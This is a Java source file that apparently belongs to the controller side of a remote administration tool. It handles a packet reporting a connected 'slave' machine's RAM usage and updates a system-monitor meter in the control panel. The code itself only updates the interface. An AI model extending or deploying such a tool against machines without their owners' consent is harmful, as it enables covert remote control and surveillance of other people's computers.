package com.redpois0n.packets;

import com.redpois0n.Slave;
import com.redpois0n.ui.frames.FrameControlPanel;
import com.redpois0n.ui.panels.PanelControlSystemMonitor;
import com.redpois0n.utils.Util;

public class PacketHERERAM extends Packet {

	@Override
	public void read(Slave slave, String line) throws Exception {
		long MB = Long.parseLong(slave.readLine());
		long MAX = Long.parseLong(slave.readLine());
		FrameControlPanel frame = FrameControlPanel.instances.get(slave);	
		if (frame != null) {
			PanelControlSystemMonitor panel = (PanelControlSystemMonitor) frame.panels.get("system monitor");
			
			if (panel != null) {
				panel.ramMeter.values.add(0, Integer.parseInt(MB + ""));
				if (Integer.parseInt(MB + "") > panel.ramMeter.maxram) {
					panel.ramMeter.maxram = Integer.parseInt(MAX + "");
				}
				if (frame.getTabbedPane().getTitleAt(1).equals("System Info") && frame.getTabbedPane().getSelectedIndex() == 1) {
					panel.panelRAM.image = panel.ramMeter.generate(panel.panelRAM.getWidth(), panel.panelRAM.getHeight());
					
					panel.panelRAM.paintComponent(panel.panelRAM.getGraphics());
				}
				panel.barRAM.setValue(Util.getPercentFromTotal((int) MB, (int) MAX));
			}			
		}

	}

}
